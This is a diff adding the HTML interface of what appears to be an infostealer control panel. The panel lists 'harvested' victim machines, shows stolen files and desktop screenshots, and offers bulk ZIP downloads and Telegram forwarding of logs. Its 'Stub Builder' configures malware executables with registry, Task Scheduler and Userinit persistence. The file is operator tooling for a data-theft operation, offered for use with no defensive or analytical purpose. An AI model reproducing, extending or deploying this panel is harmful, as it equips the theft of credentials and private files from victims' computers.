@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aesthetic Control Center</title>
+    <!-- Google Fonts: Outfit & Space Grotesk -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body class="theme-default">
+    <!-- Transparent Overlay for Theme Backgrounds -->
+    <div class="background-overlay"></div>
+
+    <!-- Main Container -->
+    <div class="app-container">
+        <!-- Sidebar Navigation -->
+        <aside class="sidebar">
+            <div class="brand">
+                <div class="brand-logo">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>
+                </div>
+                <div class="brand-text">
+                    <h1>Aesthetic</h1>
+                    <span>Control Center</span>
+                </div>
+            </div>
+
+            <nav class="nav-menu">
+                <button class="nav-btn active" data-tab="dashboard">
+                    <span class="icon">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="9"/><rect x="14" y="3" width="7" height="5"/><rect x="14" y="12" width="7" height="9"/><rect x="3" y="16" width="7" height="5"/></svg>
+                    </span> Dashboard
+                </button>
+                <button class="nav-btn" data-tab="clients">
+                    <span class="icon">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+                    </span> Clients
+                </button>
+                <button class="nav-btn" data-tab="builder">
+                    <span class="icon">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg>
+                    </span> Stub Builder
+                </button>
+                <button class="nav-btn" data-tab="settings">
+                    <span class="icon">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
+                    </span> Settings
+                </button>
+            </nav>
+
+            <!-- Admin tab (hidden by default, shown for admins) -->
+            <div class="nav-admin-section" id="nav-admin-section" style="display: none;">
+                <div class="nav-divider"></div>
+                <button class="nav-btn" data-tab="admin">
+                    <span class="icon">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                    </span> Admin Panel
+                </button>
+            </div>
+
+            <div class="sidebar-footer">
+                <div class="user-info" id="sidebar-user-info">
+                    <div class="user-avatar">
+                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+                    </div>
+                    <div class="user-details">
+                        <span class="user-name" id="sidebar-username">—</span>
+                        <span class="user-role" id="sidebar-role">—</span>
+                    </div>
+                    <button class="btn-icon btn-logout" id="logout-btn" title="Logout">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
+                    </button>
+                </div>
+                <span class="version-tag">v2.0.0</span>
+            </div>
+        </aside>
+
+        <!-- Main Content Panel -->
+        <main class="main-content">
+            <!-- Dashboard Tab -->
+            <section id="dashboard-tab" class="tab-content active">
+                <header class="header">
+                    <h2>System Overview</h2>
+                    <p class="subtitle">Global statistics and recent data collection</p>
+                </header>
+
+                <div class="stats-grid">
+                    <div class="stat-card liquid-glass liquid-glass-tilt">
+                        <div class="stat-icon purple">
+                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+                        </div>
+                        <div class="stat-info">
+                            <span class="stat-label">Total Harvests</span>
+                            <h3 id="stat-total-logs">0</h3>
+                        </div>
+                    </div>
+                    <div class="stat-card liquid-glass liquid-glass-tilt">
+                        <div class="stat-icon gold">
+                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z"/></svg>
+                        </div>
+                        <div class="stat-info">
+                            <span class="stat-label">Logs Today</span>
+                            <h3 id="stat-logs-today">0</h3>
+                        </div>
+                    </div>
+                    <div class="stat-card liquid-glass liquid-glass-tilt">
+                        <div class="stat-icon blue">
+                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
+                        </div>
+                        <div class="stat-info">
+                            <span class="stat-label">Unique Targets</span>
+                            <h3 id="stat-unique-ips">0</h3>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="dashboard-charts">
+                    <!-- Operating Systems Card -->
+                    <div class="panel-card liquid-glass liquid-glass-edge os-card">
+                        <h3>Operating Systems</h3>
+                        <div class="os-list" id="os-list">
+                            <p class="empty-state">No OS data available yet.</p>
+                        </div>
+                    </div>
+
+                    <!-- Recent Activity Card -->
+                    <div class="panel-card liquid-glass liquid-glass-edge activity-card">
+                        <h3>Recent Harvests</h3>
+                        <div class="recent-list" id="recent-list">
+                            <p class="empty-state">No recent activity.</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Clients Tab -->
+            <section id="clients-tab" class="tab-content">
+                <header class="header">
+                    <h2>Harvested Clients</h2>
+                    <p class="subtitle">Horizontal list of all captured target machines</p>
+                </header>
+
+                <div class="table-actions">
+                    <div class="search-box">
+                        <span class="search-icon"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg></span>
+                        <input type="text" id="search-input" placeholder="Search by username, hostname, OS, or IP...">
+                    </div>
+                    <button class="btn btn-outline" id="refresh-logs-btn"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="margin-right:6px;"><path d="M21.5 2v6h-6M21.34 15.57a10 10 0 1 1-.57-8.38l5.67-5.67"/></svg> Refresh</button>
+                    <button class="btn btn-outline btn-danger" id="delete-offline-btn" style="margin-left:8px;"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="margin-right:6px;"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg> Clear Offline</button>
+                </div>
+
+                <!-- Bulk Actions -->
+                <div class="bulk-actions" id="bulk-actions">
+                    <span class="bulk-count"><span id="bulk-count-num">0</span> selected</span>
+                    <button class="btn btn-outline btn-sm" id="bulk-download-btn"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="margin-right:4px;"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg> Download</button>
+                    <button class="btn btn-outline btn-sm btn-danger" id="bulk-delete-btn"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="margin-right:4px;"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg> Delete</button>
+                </div>
+
+                <!-- Clients Horizontal Column List -->
+                <div class="clients-list" id="clients-list-container">
+                    <!-- Loaded dynamically via JS -->
+                    <div class="empty-state py-8">Loading client list...</div>
+                </div>
+
+                <div class="pagination">
+                    <button class="btn btn-outline" id="prev-page-btn" disabled><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:6px;"><polyline points="15 18 9 12 15 6"/></svg> Previous</button>
+                    <span class="page-info">Page <strong id="current-page">1</strong> of <strong id="total-pages">1</strong></span>
+                    <button class="btn btn-outline" id="next-page-btn" disabled>Next <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-left:6px;"><polyline points="9 18 15 12 9 6"/></svg></button>
+                </div>
+            </section>
+
+            <!-- Builder Tab -->
+            <section id="builder-tab" class="tab-content">
+                <header class="header">
+                    <h2>Client Stub Builder</h2>
+                    <p class="subtitle">Configure and compile customized client executables</p>
+                </header>
+
+                <div class="builder-grid">
+                    <div class="panel-card liquid-glass liquid-glass-edge builder-form-card">
+                        <h3>Configuration Options</h3>
+                        
+                        <div class="form-group">
+                            <label>Delivery Method</label>
+                            <div class="radio-group">
+                                <label class="radio-label">
+                                    <input type="radio" name="build-delivery" value="TELEGRAM" checked>
+                                    <span>Telegram Bot</span>
+                                </label>
+                                <label class="radio-label">
+                                    <input type="radio" name="build-delivery" value="PANEL">
+                                    <span>Web Panel</span>
+                                </label>
+                            </div>
+                        </div>
+
+                        <!-- Telegram Fields -->
+                        <div id="build-tg-fields">
+                            <div class="form-group">
+                                <label for="build-tg-token">Telegram Bot Token</label>
+                                <input type="password" id="build-tg-token" placeholder="e.g. 123456789:ABCdefGhIJKlmNoPQRstUVwxyZ">
+                            </div>
+                            <div class="form-group">
+                                <label for="build-tg-chat">Telegram Chat ID / Channel ID</label>
+                                <input type="text" id="build-tg-chat" placeholder="e.g. -1001234567890">
+                            </div>
+                        </div>
+
+                        <!-- Panel fields auto-filled -->
+                        <div id="build-panel-fields" style="display: none;"></div>
+
+                        <!-- Persistence Methods -->
+                        <div class="form-group">
+                            <label>Persistence Methods</label>
+                            <div class="persistence-select-wrapper">
+                                <div class="persistence-toggle" id="persistence-toggle">
+                                    <span id="persistence-label">All Methods</span>
+                                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg>
+                                </div>
+                                <div class="persistence-dropdown" id="persistence-dropdown">
+                                    <label class="dropdown-option">
+                                        <input type="checkbox" value="registry" checked> Registry Run Key
+                                    </label>
+                                    <label class="dropdown-option">
+                                        <input type="checkbox" value="scheduler" checked> Task Scheduler
+                                    </label>
+                                    <label class="dropdown-option">
+                                        <input type="checkbox" value="userinit" checked> Userinit
+                                    </label>
+                                    <label class="dropdown-option">
+                                        <input type="checkbox" value="none" id="persist-none"> None
+                                    </label>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="form-actions mt-6">
+                            <button class="btn btn-primary w-full" id="btn-build-stub"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="margin-right:8px;"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg> Build Client Stub</button>
+                        </div>
+                    </div>
+
+                    <!-- Builder Console Logs -->
+                    <div class="panel-card liquid-glass liquid-glass-edge builder-console-card">
+                        <h3>Build Logging</h3>
+                        <div class="console-output" id="build-console">
+                            <span class="log-info">Ready to build customized binary stub template...</span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Admin Tab -->
+            <section id="admin-tab" class="tab-content">
+                <header class="header">
+                    <h2>Administration</h2>
+                    <p class="subtitle">Manage users, permissions and access control</p>
+                </header>
+
+                <div class="admin-stats-row" id="admin-stats-row"></div>
+
+                <div class="panel-card liquid-glass liquid-glass-edge">
+                    <h3>User Management</h3>
+                    <div class="admin-users-table" id="admin-users-table">
+                        <div class="empty-state py-8">Loading users...</div>
+                    </div>
+                </div>
+
+                <div class="panel-card liquid-glass liquid-glass-edge">
+                    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;">
+                        <h3>Invitation Codes</h3>
+                        <button class="btn btn-primary btn-sm" id="btn-gen-invite">Generate Invite</button>
+                    </div>
+                    <div id="invites-list">
+                        <div class="empty-state py-4">Loading invites...</div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Settings Tab -->
+            <section id="settings-tab" class="tab-content">
+                <header class="header">
+                    <h2>Panel Settings</h2>
+                    <p class="subtitle">Manage panel preferences, customization, and forwarding</p>
+                </header>
+
+                <div class="settings-grid">
+                    <!-- Appearance Card -->
+                    <div class="panel-card liquid-glass liquid-glass-edge">
+                        <h3>Custom Theme & Background</h3>
+                        <p class="card-desc">Select a built-in background theme, or upload your own image.</p>
+                        
+                        <div class="theme-selectors">
+                            <button class="theme-selector active" data-theme="theme-default">
+                                <span class="theme-preview bg-default"></span> Original Dark
+                            </button>
+                            <button class="theme-selector" data-theme="theme-aurora">
+                                <span class="theme-preview bg-aurora"></span> Northern Lights
+                            </button>
+                            <button class="theme-selector" data-theme="theme-nebula">
+                                <span class="theme-preview bg-nebula"></span> Space Nebula
+                            </button>
+                            <button class="theme-selector" data-theme="theme-crimson">
+                                <span class="theme-preview bg-crimson"></span> Crimson Red
+                            </button>
+                        </div>
+
+                        <div class="custom-bg-section mt-6">
+                            <h4>Upload Custom Background</h4>
+                            <div class="upload-wrapper mt-3">
+                                <input type="file" id="custom-bg-input" accept="image/*" style="display: none;">
+                                <button class="btn btn-outline" onclick="document.getElementById('custom-bg-input').click()"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:6px;"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg> Choose Photo</button>
+                                <button class="btn btn-outline btn-danger" id="delete-custom-bg-btn" style="display: none;">Remove Image</button>
+                            </div>
+
+                            <div class="form-group mt-4" id="blur-control-group" style="display: none;">
+                                <label for="bg-blur-slider">Background Blur: <span id="blur-val-display">15px</span></label>
+                                <input type="range" id="bg-blur-slider" min="0" max="40" value="15" class="slider-range">
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Telegram Forwarder settings -->
+                    <div class="panel-card liquid-glass liquid-glass-edge">
+                        <h3>Telegram Notification Forwarder</h3>
+                        <p class="card-desc">Automatically forward all incoming logs directly to a Telegram bot.</p>
+
+                        <div class="settings-form">
+                            <div class="form-group toggle-group">
+                                <label class="switch-label">
+                                    <span class="label-title">Enable Forwarding</span>
+                                    <span class="label-desc">Send logs to Telegram in real-time</span>
+                                </label>
+                                <label class="switch">
+                                    <input type="checkbox" id="tg-enable-checkbox">
+                                    <span class="slider"></span>
+                                </label>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="tg-token-input">Bot Token</label>
+                                <input type="password" id="tg-token-input" placeholder="1234567890:ABCdefGhIJKlmNoPQRstUVwxyZ">
+                            </div>
+
+                            <div class="form-group">
+                                <label for="tg-chat-input">Chat ID / Channel ID</label>
+                                <input type="text" id="tg-chat-input" placeholder="-1001234567890">
+                            </div>
+
+                            <div class="form-actions">
+                                <button class="btn btn-primary" id="save-settings-btn">Save Settings</button>
+                                <span class="save-status" id="save-status"></span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Panel Preferences settings -->
+                    <div class="panel-card liquid-glass liquid-glass-edge">
+                        <h3>Panel Preferences</h3>
+                        <p class="card-desc">Configure sound notifications and client auto-refresh preferences.</p>
+
+                        <div class="settings-form">
+                            <div class="form-group toggle-group">
+                                <label class="switch-label">
+                                    <span class="label-title">Sound Notifications</span>
+                                    <span class="label-desc">Play notify.mp3 when a new log arrives</span>
+                                </label>
+                                <label class="switch">
+                                    <input type="checkbox" id="sound-alerts-checkbox" checked>
+                                    <span class="slider"></span>
+                                </label>
+                            </div>
+
+                            <div class="form-group toggle-group mt-4">
+                                <label class="switch-label">
+                                    <span class="label-title">Auto-Refresh Logs</span>
+                                    <span class="label-desc">Periodically refresh dashboard and client list</span>
+                                </label>
+                                <label class="switch">
+                                    <input type="checkbox" id="auto-refresh-checkbox" checked>
+                                    <span class="slider"></span>
+                                </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <!-- Details Overlay Modal -->
+    <div class="modal" id="details-modal">
+        <div class="modal-backdrop"></div>
+        <div class="modal-wrapper">
+            <div class="modal-card liquid-glass liquid-glass-edge">
+                <div class="modal-header">
+                    <div>
+                        <h3 id="modal-title">Log Inspection</h3>
+                        <span id="modal-subtitle">Details</span>
+                    </div>
+                    <button class="modal-close" id="modal-close-btn">✕</button>
+                </div>
+                <div class="modal-body">
+                    <div class="modal-grid">
+                        <!-- Left pane: meta & files -->
+                        <div class="modal-pane">
+                            <div class="meta-section">
+                                <h4>Target Specifications</h4>
+                                <div class="meta-grid" id="modal-meta-grid">
+                                    <!-- Dynamic -->
+                                </div>
+                            </div>
+
+                            <div class="files-section">
+                                <h4>Stolen Content Files</h4>
+                                <div class="file-list-container">
+                                    <ul class="file-list" id="modal-file-list">
+                                        <!-- Dynamic -->
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Right pane: screenshot / file viewer -->
+                        <div class="modal-pane">
+                            <div class="screenshot-section" id="screenshot-section">
+                                <h4>Desktop Screenshot</h4>
+                                <div class="screenshot-container" id="modal-screenshot-container">
+                                    <!-- Dynamic -->
+                                </div>
+                            </div>
+                            <div class="file-viewer-section" id="file-viewer-section" style="display: none;">
+                                <div class="file-viewer-header">
+                                    <h4 id="file-viewer-title">File Viewer</h4>
+                                    <button class="btn-icon" id="file-viewer-close" title="Close viewer">
+                                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+                                    </button>
+                                </div>
+                                <div class="file-viewer-content" id="file-viewer-content">
+                                    <!-- Dynamic -->
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button class="btn btn-outline btn-danger" id="modal-delete-btn"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:6px;"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/><line x1="10" y1="11" x2="10" y2="17"/><line x1="14" y1="11" x2="14" y2="17"/></svg> Delete Log</button>
+                    <a href="#" class="btn btn-primary" id="modal-download-btn" download><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:6px;"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg> Download Full ZIP</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Custom Confirm/Alert Dialog -->
+    <div class="dialog-overlay" id="dialog-overlay">
+        <div class="dialog-card liquid-glass liquid-glass-edge">
+            <div class="dialog-icon" id="dialog-icon"></div>
+            <h3 class="dialog-title" id="dialog-title"></h3>
+            <p class="dialog-message" id="dialog-message"></p>
+            <div class="dialog-actions" id="dialog-actions"></div>
+        </div>
+    </div>
+
+    <!-- Toast Notification Container -->
+    <div class="toast-container" id="toast-container"></div>
+
+    <script src="app.js"></script>
+</body>
+</html>
